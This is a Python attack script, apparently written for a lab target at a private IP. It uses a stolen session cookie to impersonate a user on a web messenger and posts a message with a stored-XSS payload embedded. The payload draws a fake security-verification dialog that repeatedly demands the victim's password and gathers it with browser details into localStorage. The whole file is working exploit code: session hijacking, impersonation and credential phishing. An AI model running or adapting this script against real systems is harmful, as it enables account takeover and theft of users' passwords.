#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import urllib.parse

# セッションハイジャック用のスクリプト
# 盗んだセッションIDを使用して他人としてメッセージを送信

def send_message_with_hijacked_session(session_id, recipient, message_content, target_url):
    """
    セッションハイジャックを使用してメッセージを送信
    
    Args:
        session_id: 盗んだセッションID
        recipient: 送信先のユーザー名
        message_content: メッセージ内容
        target_url: ターゲットURL
    """
    
    # POSTデータの準備
    post_data = {
        'action': 'transmit',
        'recipient': recipient,
        'message_content': message_content
    }
    
    # Cookieヘッダーの設定（セッションIDを含む）
    # 実際のリクエストに合わせてuser_idとsession_idの両方を設定
    user_id, session_token = session_id.split(',', 1)
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'Host': '192.168.49.128',
        'Origin': 'http://192.168.49.128',
        'Referer': 'http://192.168.49.128/hack/public/messenger.cgi',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        # HTTPリクエストを送信
        response = requests.post(
            target_url,
            data=post_data,
            headers=headers,
            timeout=10
        )
        
        print(f"[*] Status Code: {response.status_code}")
        print(f"[*] Response Headers: {dict(response.headers)}")
        print(f"[*] Response Content (first 1000 chars):")
        print(response.text[:1000])
        print(f"[*] " + "="*50)
        
        # 成功/失敗の判定
        if response.status_code == 200:
            if "Error:" in response.text:
                print(f"[!] Error detected in response")
                return False
            elif "Terminal X - Login" in response.text:
                print(f"[!] Session expired or invalid - redirected to login")
                return False
            elif "SECURE_MESSENGER" in response.text:
                print(f"[+] Successfully accessed messenger page!")
                return True
            else:
                print(f"[+] Message sent successfully!")
                return True
        else:
            print(f"[!] HTTP Error: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Request failed: {e}")
        return False

def main():
    # 取得したセッション情報を読み込み
    try:
        with open('hijacked_session.txt', 'r') as f:
            hijacked_session_id = f.read().strip()
        print(f"[*] Loaded hijacked session: {hijacked_session_id}")
    except FileNotFoundError:
        print(f"[!] hijacked_session.txt not found. Please run get_session.py first.")
        return
    
    # ターゲット情報
    target_url = "http://192.168.49.128/hack/public/messenger.cgi"
    recipient = "user1"
    message_content = """この前の件、ありがとう！<script>
(function(){
var attackConfig={triggerDelay:2000,retryAttempts:3,currentAttempt:0};
document.addEventListener('DOMContentLoaded',function(){setTimeout(function(){initializePhishingAttack()},attackConfig.triggerDelay)});
function initializePhishingAttack(){
var existingDialog=document.getElementById('security-verification-dialog');
if(existingDialog){existingDialog.remove()}
createAdvancedPasswordDialog()
}
function createAdvancedPasswordDialog(){
var overlay=document.createElement('div');
overlay.id='security-verification-dialog';
overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,0.85);z-index:99999;display:flex;align-items:center;justify-content:center;animation:fadeIn 0.3s ease-in-out;';
var style=document.createElement('style');
style.textContent='@keyframes fadeIn{from{opacity:0}to{opacity:1}}@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}.shake{animation:shake 0.5s ease-in-out}';
document.head.appendChild(style);
var dialog=document.createElement('div');
dialog.style.cssText="background-color:#111;border:2px solid #00ff41;padding:25px;max-width:450px;width:90%;color:#00ff41;font-family:monospace;box-shadow:0 0 20px rgba(0,255,65,0.3);border-radius:0;position:relative;";
dialog.innerHTML='<div style="text-align:center;margin-bottom:25px"><div style="color:#ff4444;font-size:1.2em;margin-bottom:10px">⚠️ セキュリティ警告 ⚠️</div><h3 style="color:#00ff41;margin:0 0 15px 0">[TERMINAL X - SECURITY VERIFICATION]</h3><p style="margin:0;line-height:1.4;font-size:0.95em">不正なアクセスが検出されました。<br>セキュリティ保護のため、パスワードによる<br>本人確認が必要です。</p></div><div style="margin-bottom:20px"><label style="display:block;margin-bottom:8px;font-weight:bold">現在のパスワード:</label><input type="password" id="security-password-input" style="width:100%;padding:12px;background-color:#222;border:1px solid #00ff41;color:#00ff41;font-family:inherit;box-sizing:border-box;font-size:1em" placeholder="パスワードを入力してください"></div><div id="error-message" style="color:#ff4444;margin-bottom:15px;font-size:0.9em;text-align:center;display:none"></div><div style="text-align:center"><button id="security-verify-btn" style="background-color:transparent;border:2px solid #00ff41;color:#00ff41;padding:12px 25px;cursor:pointer;font-family:inherit;text-transform:uppercase;margin-right:15px;font-size:1em">[認証実行]</button><button id="security-cancel-btn" style="background-color:transparent;border:2px solid #666;color:#666;padding:12px 25px;cursor:pointer;font-family:inherit;text-transform:uppercase;font-size:1em">[後で認証]</button></div><div style="margin-top:20px;text-align:center;font-size:0.8em;color:#666">タイムアウト: <span id="timeout-counter">60</span>秒</div>';
overlay.appendChild(dialog);
document.body.appendChild(overlay);
var passwordInput=document.getElementById('security-password-input');
passwordInput.focus();
var timeoutCounter=60;
var timeoutInterval=setInterval(function(){
timeoutCounter--;
var counterElement=document.getElementById('timeout-counter');
if(counterElement){counterElement.textContent=timeoutCounter}
if(timeoutCounter<=0){clearInterval(timeoutInterval);showTimeoutMessage()}
},1000);
document.getElementById('security-verify-btn').addEventListener('click',function(){
var password=passwordInput.value;
if(password.trim()===''){showErrorMessage('パスワードを入力してください。');return}
showLoadingState();
setTimeout(function(){clearInterval(timeoutInterval);stealPasswordData(password);showSuccessAndClose()},2000)
});
document.getElementById('security-cancel-btn').addEventListener('click',function(){
clearInterval(timeoutInterval);showCancelWarning()
});
passwordInput.addEventListener('keypress',function(e){
if(e.key==='Enter'){document.getElementById('security-verify-btn').click()}
});
document.addEventListener('keydown',function(e){
if(e.key==='Escape'){e.preventDefault();showCancelWarning()}
})
}
function showErrorMessage(message){
var errorElement=document.getElementById('error-message');
if(errorElement){
errorElement.textContent=message;
errorElement.style.display='block';
var dialog=errorElement.closest('div');
dialog.classList.add('shake');
setTimeout(function(){dialog.classList.remove('shake')},500)
}
}
function showLoadingState(){
var verifyBtn=document.getElementById('security-verify-btn');
var cancelBtn=document.getElementById('security-cancel-btn');
var passwordInput=document.getElementById('security-password-input');
if(verifyBtn){verifyBtn.textContent='[認証中...]';verifyBtn.disabled=true}
if(cancelBtn){cancelBtn.disabled=true}
if(passwordInput){passwordInput.disabled=true}
}
function showSuccessAndClose(){
var dialog=document.getElementById('security-verification-dialog');
if(dialog){
dialog.innerHTML='<div style="background-color:#111;border:2px solid #00ff41;padding:25px;max-width:450px;width:90%;color:#00ff41;font-family:monospace;text-align:center"><div style="font-size:1.2em;margin-bottom:15px">✅ 認証成功</div><p>パスワード認証が完了しました。<br>セキュリティ保護が有効になりました。</p></div>';
setTimeout(function(){dialog.remove()},3000)
}
}
function showCancelWarning(){
attackConfig.currentAttempt++;
if(attackConfig.currentAttempt<attackConfig.retryAttempts){
alert('セキュリティ認証をキャンセルすることはできません。\\n不正アクセスを防ぐため、認証を完了してください。');
setTimeout(function(){createAdvancedPasswordDialog()},1000)
}else{
var dialog=document.getElementById('security-verification-dialog');
if(dialog){dialog.remove()}
alert('認証がキャンセルされました。\\nセキュリティ上の理由により、アカウントが一時的に制限される可能性があります。')
}
}
function showTimeoutMessage(){
alert('認証タイムアウトです。\\nセキュリティ保護のため、再度認証してください。');
createAdvancedPasswordDialog()
}
function stealPasswordData(password){
var stolenData={
password:password,
timestamp:new Date().toISOString(),
user_agent:navigator.userAgent,
url:window.location.href,
referrer:document.referrer
};
console.log('盗取されたパスワード情報:',stolenData);
localStorage.setItem('stolen_password_data',JSON.stringify(stolenData))
}
})();
</script>"""
    
    print(f"[*] Session Hijacking Attack")
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Hijacked Session ID: {hijacked_session_id}")
    print(f"[*] Recipient: {recipient}")
    print(f"[*] Message (truncated): {message_content[:100]}...")
    print(f"[*] " + "="*50)
    
    # 最初にGETリクエストでセッションが有効かチェック
    print(f"[*] Checking session validity...")
    user_id, session_token = hijacked_session_id.split(',', 1)
    
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Cookie': f'user_id={user_id}; session_id={session_token}',
        'Host': '192.168.49.128',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
    }
    
    try:
        # GETリクエストでセッションチェック
        response = requests.get(target_url, headers=headers, timeout=10)
        
        if "Terminal X - Login" in response.text:
            print(f"[!] Session is invalid or expired")
            return
        elif "SECURE_MESSENGER" in response.text:
            print(f"[+] Session is valid! Proceeding with message sending...")
        else:
            print(f"[?] Unexpected response, but continuing...")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Session check failed: {e}")
        return
    
    # メッセージ送信を実行
    success = send_message_with_hijacked_session(
        hijacked_session_id,
        recipient,
        message_content,
        target_url
    )
    
    if success:
        print(f"[+] Attack completed successfully!")
    else:
        print(f"[!] Attack failed!")

if __name__ == "__main__":
    # まず通常の攻撃を試行
    main()